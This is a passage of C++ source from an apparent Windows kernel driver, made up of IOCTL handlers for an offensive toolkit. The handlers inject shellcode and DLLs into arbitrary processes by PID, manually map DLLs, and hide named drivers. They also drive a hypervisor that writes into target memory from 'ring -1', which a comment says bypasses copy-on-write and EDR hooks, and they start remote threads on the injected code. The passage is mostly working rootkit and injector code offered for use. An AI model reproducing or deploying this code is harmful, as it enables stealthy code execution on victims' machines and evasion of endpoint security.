		KdPrint((DRIVER_PREFIX "Exception during PspCidTable enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	return status;
}

// ============== Kernel Injection Handlers ==============

NTSTATUS HandleKernelInjectShellcode(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel shellcode injection request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelInjectShellcodeRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelInjectShellcodeResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (KernelInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->ShellcodeSize == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(KernelInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Injecting %u bytes of shellcode into PID %u\n",
		request->ShellcodeSize, request->TargetProcessId));

	PVOID allocatedAddress = nullptr;
	NTSTATUS status = KernelInjectShellcode(
		request->TargetProcessId,
		request->Shellcode,
		request->ShellcodeSize,
		&allocatedAddress
	);

	if (NT_SUCCESS(status))
	{
		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		*info = sizeof(KernelInjectShellcodeResponse);
		KdPrint((DRIVER_PREFIX "Kernel shellcode injection successful\n"));
	}
	else
	{
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		*info = sizeof(KernelInjectShellcodeResponse);
		KdPrint((DRIVER_PREFIX "Kernel shellcode injection failed: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleKernelInjectDll(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel DLL injection request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelInjectDllRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelInjectDllResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelInjectDllRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (KernelInjectDllResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure DLL path is null-terminated
	request->DllPath[MAX_DLL_PATH_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Injecting DLL into PID %u: %ws\n",
		request->TargetProcessId, request->DllPath));

	PVOID allocatedAddress = nullptr;
	PVOID loadLibraryAddress = nullptr;
	NTSTATUS status = KernelInjectDll(
		request->TargetProcessId,
		request->DllPath,
		&allocatedAddress,
		&loadLibraryAddress
	);

	if (NT_SUCCESS(status))
	{
		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		response->LoadLibraryAddress = (ULONG64)loadLibraryAddress;
		*info = sizeof(KernelInjectDllResponse);
		KdPrint((DRIVER_PREFIX "Kernel DLL injection successful\n"));
	}
	else
	{
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		response->LoadLibraryAddress = 0;
		*info = sizeof(KernelInjectDllResponse);
		KdPrint((DRIVER_PREFIX "Kernel DLL injection failed: 0x%X\n", status));
	}

	return status;
}

// ============== Kernel Manual Map Handler ==============

NTSTATUS HandleKernelManualMap(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel manual map injection request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelManualMapRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelManualMapResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelManualMapRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (KernelManualMapResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->DllSize == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size includes DLL bytes
	SIZE_T expectedSize = FIELD_OFFSET(KernelManualMapRequest, DllBytes) + request->DllSize;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Manual mapping %u bytes DLL into PID %u, flags: 0x%X\n",
		request->DllSize, request->TargetProcessId, request->Flags));

	ManualMapResult result = { 0 };
	NTSTATUS status = KernelManualMapDll(
		request->DllBytes,
		request->DllSize,
		request->TargetProcessId,
		request->Flags,
		&result
	);

	response->MappedBase = (ULONG64)result.MappedBase;
	response->MappedSize = (ULONG64)result.MappedSize;
	response->EntryPoint = (ULONG64)result.EntryPoint;
	response->Success = result.Success;
	*info = sizeof(KernelManualMapResponse);

	if (result.Success)
	{
		KdPrint((DRIVER_PREFIX "Manual map successful: base=0x%llX, size=0x%llX\n",
			response->MappedBase, response->MappedSize));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Manual map failed: 0x%X\n", status));
	}

	return status;
}

// ============== Hypervisor Control Handlers ==============

NTSTATUS HandleHvStart(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Starting hypervisor...\n"));

	NTSTATUS status = HvStartHypervisor();

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Hypervisor started successfully\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to start hypervisor: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleHvStop(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Stopping hypervisor...\n"));
	HvStopHypervisor();
	KdPrint((DRIVER_PREFIX "Hypervisor stopped\n"));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvPing(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(HvPingResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HvPingResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsRunning = HvIsHypervisorRunning();
	response->HooksInstalled = HvAreHooksInstalled();
	response->ProtectedProcessCount = HvGetProtectedPidCount();

	*info = sizeof(HvPingResponse);

	KdPrint((DRIVER_PREFIX "HV Ping: Running=%d, Hooks=%d, Protected=%u\n",
		response->IsRunning, response->HooksInstalled, response->ProtectedProcessCount));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvInstallHooks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Installing protection hooks...\n"));

	NTSTATUS status = HvInstallProtectionHooks();

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Protection hooks installed successfully\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to install protection hooks: 0x%X\n", status));
	}

	return status;
}

NTSTATUS HandleHvRemoveHooks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	KdPrint((DRIVER_PREFIX "Removing protection hooks...\n"));
	HvRemoveProtectionHooks();
	KdPrint((DRIVER_PREFIX "Protection hooks removed\n"));

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvProtectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint((DRIVER_PREFIX "HV protecting process PID %u\n", request->ProcessId));

	bool success = HvAddProtectedPid(request->ProcessId);
	return success ? STATUS_SUCCESS : STATUS_INSUFFICIENT_RESOURCES;
}

NTSTATUS HandleHvUnprotectProcess(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint((DRIVER_PREFIX "HV unprotecting process PID %u\n", request->ProcessId));

	bool success = HvRemoveProtectedPid(request->ProcessId);
	return success ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS HandleHvIsProcessProtected(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvProtectProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvIsProtectedResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvProtectProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvIsProtectedResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsProtected = HvIsProcessProtectedByPid(request->ProcessId);
	*info = sizeof(HvIsProtectedResponse);

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvListProtected(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(HvListProtectedResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HvListProtectedResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(HvListProtectedResponse));

	ULONG returnedCount = 0;
	NTSTATUS status = HvGetProtectedPidList(response->Pids, sizeof(response->Pids), &returnedCount);
	response->Count = returnedCount;

	*info = sizeof(HvListProtectedResponse);

	return status;
}

// ============== Hypervisor Driver Hiding Handlers ==============

NTSTATUS HandleHvHideDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(HideDriverRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HideDriverRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->DriverName[sizeof(request->DriverName) - 1] = '\0';

	if (strlen(request->DriverName) == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!HvEnableDriverHiding(request->DriverName))
	{
		return STATUS_UNSUCCESSFUL;
	}

	KdPrint((DRIVER_PREFIX "Driver hiding enabled for: %s\n", request->DriverName));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvUnhideDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	HvDisableDriverHiding();
	KdPrint((DRIVER_PREFIX "Driver hiding disabled\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvIsDriverHidden(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(DriverHiddenResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (DriverHiddenResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	response->IsHidden = HvIsDriverHidingEnabled();
	response->HiddenCount = HvGetHiddenDriverCount();
	*info = sizeof(DriverHiddenResponse);

	return STATUS_SUCCESS;
}

NTSTATUS HandleHvRemoveHiddenDriver(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(info);

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

	if (inputLen < sizeof(HideDriverRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HideDriverRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	request->DriverName[sizeof(request->DriverName) - 1] = '\0';

	if (!HvRemoveHiddenDriver(request->DriverName))
	{
		return STATUS_NOT_FOUND;
	}

	KdPrint((DRIVER_PREFIX "Removed hidden driver: %s\n", request->DriverName));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvClearHiddenDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);
	UNREFERENCED_PARAMETER(info);

	HvClearHiddenDrivers();
	KdPrint((DRIVER_PREFIX "Cleared all hidden drivers\n"));
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvListHiddenDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (outputLen < sizeof(HiddenDriverListResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (HiddenDriverListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(HiddenDriverListResponse));

	ULONG returnedCount = 0;
	NTSTATUS status = HvGetHiddenDriverList((char*)response->DriverNames, sizeof(response->DriverNames), &returnedCount);
	response->Count = returnedCount;

	*info = sizeof(HiddenDriverListResponse);

	return status;
}

// ============== Ring -1 Injection Handlers ==============

NTSTATUS HandleHvInjectShellcode(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Ring -1 shellcode injection request\n"));

	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 injection\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvInjectShellcodeRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvInjectShellcodeResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->ShellcodeSize == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(HvInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Ring -1 injecting %u bytes into PID %u\n",
		request->ShellcodeSize, request->TargetProcessId));

	NTSTATUS status = STATUS_SUCCESS;
	PVOID allocatedAddress = nullptr;

	// Step 1: Open target process and allocate memory
	PEPROCESS targetProcess = nullptr;
	status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->TargetProcessId, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
		return status;
	}

	// Attach to target process to allocate memory
	KAPC_STATE apcState;
	KeStackAttachProcess(targetProcess, &apcState);

	SIZE_T regionSize = request->ShellcodeSize;
	status = ZwAllocateVirtualMemory(
		ZwCurrentProcess(),
		&allocatedAddress,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		KdPrint((DRIVER_PREFIX "Failed to allocate memory: 0x%X\n", status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Allocated memory at 0x%p in target process\n", allocatedAddress));

	// Touch the memory to page it in - hypervisor needs physical backing
	// This forces the OS to allocate physical pages for the committed memory
	__try
	{
		RtlZeroMemory(allocatedAddress, request->ShellcodeSize);
		KdPrint((DRIVER_PREFIX "Memory paged in successfully\n"));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Failed to touch memory: exception\n"));
		SIZE_T freeSize = 0;
		ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	KeUnstackDetachProcess(&apcState);

	// Step 2: Use hypervisor to write shellcode (ring -1 write)
	// This bypasses all ring 0 protections (copy-on-write, EDR hooks, etc.)
	__try
	{
		ULONG64 bytesWritten = HvInjectShellcode(
			request->TargetProcessId,
			allocatedAddress,
			(PVOID)request->Shellcode,
			request->ShellcodeSize
		);

		KdPrint((DRIVER_PREFIX "Ring -1 write completed: %llu bytes written\n", bytesWritten));

		if (bytesWritten == 0)
		{
			// Fallback: ring -1 write failed (target memory not paged in, etc.)
			// Free the allocated memory
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);

			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->AllocatedAddress = 0;
			response->BytesWritten = 0;
			*info = sizeof(HvInjectShellcodeResponse);
			return STATUS_UNSUCCESSFUL;
		}

		// Step 3: Create a remote thread to execute shellcode
		// We still need to use ring 0 for thread creation (no hypercall for this yet)

		// Resolve RtlCreateUserThread
		UNICODE_STRING funcName;
		RtlInitUnicodeString(&funcName, L"RtlCreateUserThread");

		typedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(
			HANDLE ProcessHandle,
			PSECURITY_DESCRIPTOR SecurityDescriptor,
			BOOLEAN CreateSuspended,
			ULONG StackZeroBits,
			PULONG StackReserved,
			PULONG StackCommit,
			PVOID StartAddress,
			PVOID StartParameter,
			PHANDLE ThreadHandle,
			PVOID ClientId
			);

		RtlCreateUserThread_t pfnRtlCreateUserThread =
			(RtlCreateUserThread_t)MmGetSystemRoutineAddress(&funcName);

		if (!pfnRtlCreateUserThread)
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve RtlCreateUserThread\n"));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return STATUS_NOT_FOUND;
		}

		// Get a handle to the target process
		HANDLE processHandle = nullptr;
		status = ObOpenObjectByPointer(
			targetProcess,
			OBJ_KERNEL_HANDLE,
			nullptr,
			PROCESS_ALL_ACCESS,
			*PsProcessType,
			KernelMode,
			&processHandle
		);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to get process handle: 0x%X\n", status));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return status;
		}

		// Create the thread
		HANDLE threadHandle = nullptr;
		status = pfnRtlCreateUserThread(
			processHandle,
			nullptr,
			FALSE,    // Not suspended
			0,
			nullptr,
			nullptr,
			allocatedAddress,  // Start address = shellcode
			nullptr,           // No parameter
			&threadHandle,
			nullptr
		);

		ZwClose(processHandle);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to create remote thread: 0x%X\n", status));
			ObDereferenceObject(targetProcess);
			response->Success = FALSE;
			response->AllocatedAddress = (ULONG64)allocatedAddress;
			response->BytesWritten = bytesWritten;
			*info = sizeof(HvInjectShellcodeResponse);
			return status;
		}

		ZwClose(threadHandle);
		KdPrint((DRIVER_PREFIX "Ring -1 injection successful!\n"));

		response->Success = TRUE;
		response->AllocatedAddress = (ULONG64)allocatedAddress;
		response->BytesWritten = bytesWritten;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during ring -1 injection\n"));
		status = STATUS_UNSUCCESSFUL;
		response->Success = FALSE;
		response->AllocatedAddress = 0;
		response->BytesWritten = 0;
	}

	ObDereferenceObject(targetProcess);
	*info = sizeof(HvInjectShellcodeResponse);
	return status;
}

NTSTATUS HandleHvInjectDll(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Ring -1 DLL injection request\n"));

	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 injection\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvInjectDllRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvInjectDllResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvInjectDllRequest*)Irp->AssociatedIrp.SystemBuffer;
	auto response = (HvInjectDllResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (!request || request->PathLength == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate buffer size
	SIZE_T expectedSize = FIELD_OFFSET(HvInjectDllRequest, DllPath) + request->PathLength;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "Ring -1 injecting DLL into PID %u, path length %u\n",
		request->TargetProcessId, request->PathLength));

	NTSTATUS status = STATUS_SUCCESS;
	PVOID pathAddress = nullptr;

	// Step 1: Open target process
	PEPROCESS targetProcess = nullptr;
	status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->TargetProcessId, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
		return status;
	}

	// Step 2: Allocate memory for DLL path in target process
	KAPC_STATE apcState;
	KeStackAttachProcess(targetProcess, &apcState);

	SIZE_T regionSize = request->PathLength;
	status = ZwAllocateVirtualMemory(
		ZwCurrentProcess(),
		&pathAddress,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		KdPrint((DRIVER_PREFIX "Failed to allocate memory for path: 0x%X\n", status));
		return status;
	}

	// Touch the memory to page it in
	__try
	{
		RtlZeroMemory(pathAddress, request->PathLength);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		SIZE_T freeSize = 0;
		ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	KeUnstackDetachProcess(&apcState);

	KdPrint((DRIVER_PREFIX "Allocated path memory at 0x%p\n", pathAddress));

	// Step 3: Write DLL path via ring -1
	__try
	{
		ULONG64 bytesWritten = HvInjectShellcode(
			request->TargetProcessId,
			pathAddress,
			(PVOID)request->DllPath,
			request->PathLength
		);

		KdPrint((DRIVER_PREFIX "Ring -1 path write: %llu bytes\n", bytesWritten));

		if (bytesWritten == 0)
		{
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = 0;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_UNSUCCESSFUL;
		}

		// Step 4: Find LoadLibraryW in target process using existing helper
		WINDOWS_VERSION windowsVersion = GetWindowsVersion();
		PVOID loadLibraryAddr = GetLoadLibraryWAddress(request->TargetProcessId, windowsVersion);

		if (!loadLibraryAddr)
		{
			KdPrint((DRIVER_PREFIX "Failed to find LoadLibraryW\n"));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = 0;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_NOT_FOUND;
		}

		// Step 5: Create remote thread to call LoadLibraryW
		UNICODE_STRING funcName;
		RtlInitUnicodeString(&funcName, L"RtlCreateUserThread");

		typedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(
			HANDLE ProcessHandle,
			PSECURITY_DESCRIPTOR SecurityDescriptor,
			BOOLEAN CreateSuspended,
			ULONG StackZeroBits,
			PULONG StackReserved,
			PULONG StackCommit,
			PVOID StartAddress,
			PVOID StartParameter,
			PHANDLE ThreadHandle,
			PVOID ClientId
			);

		RtlCreateUserThread_t pfnRtlCreateUserThread =
			(RtlCreateUserThread_t)MmGetSystemRoutineAddress(&funcName);

		if (!pfnRtlCreateUserThread)
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve RtlCreateUserThread\n"));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return STATUS_NOT_FOUND;
		}

		// Get process handle
		HANDLE processHandle = nullptr;
		status = ObOpenObjectByPointer(
			targetProcess,
			OBJ_KERNEL_HANDLE,
			nullptr,
			PROCESS_ALL_ACCESS,
			*PsProcessType,
			KernelMode,
			&processHandle
		);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to get process handle: 0x%X\n", status));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return status;
		}

		// Create the thread
		HANDLE threadHandle = nullptr;
		status = pfnRtlCreateUserThread(
			processHandle,
			nullptr,
			FALSE,    // Not suspended
			0,
			nullptr,
			nullptr,
			loadLibraryAddr,   // Start address = LoadLibraryW
			pathAddress,       // Parameter = DLL path
			&threadHandle,
			nullptr
		);

		ZwClose(processHandle);

		if (!NT_SUCCESS(status))
		{
			KdPrint((DRIVER_PREFIX "Failed to create remote thread: 0x%X\n", status));
			KeStackAttachProcess(targetProcess, &apcState);
			SIZE_T freeSize = 0;
			ZwFreeVirtualMemory(ZwCurrentProcess(), &pathAddress, &freeSize, MEM_RELEASE);
			KeUnstackDetachProcess(&apcState);
			ObDereferenceObject(targetProcess);

			response->Success = FALSE;
			response->ModuleBase = 0;
			response->PathAddress = (ULONG64)pathAddress;
			*info = sizeof(HvInjectDllResponse);
			return status;
		}

		ZwClose(threadHandle);
		KdPrint((DRIVER_PREFIX "Ring -1 DLL injection successful!\n"));

		response->Success = TRUE;
		response->ModuleBase = 0;  // We don't wait for the thread to complete
		response->PathAddress = (ULONG64)pathAddress;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during ring -1 DLL injection\n"));
		status = STATUS_UNSUCCESSFUL;
		response->Success = FALSE;
		response->ModuleBase = 0;
		response->PathAddress = 0;
	}

	ObDereferenceObject(targetProcess);
	*info = sizeof(HvInjectDllResponse);
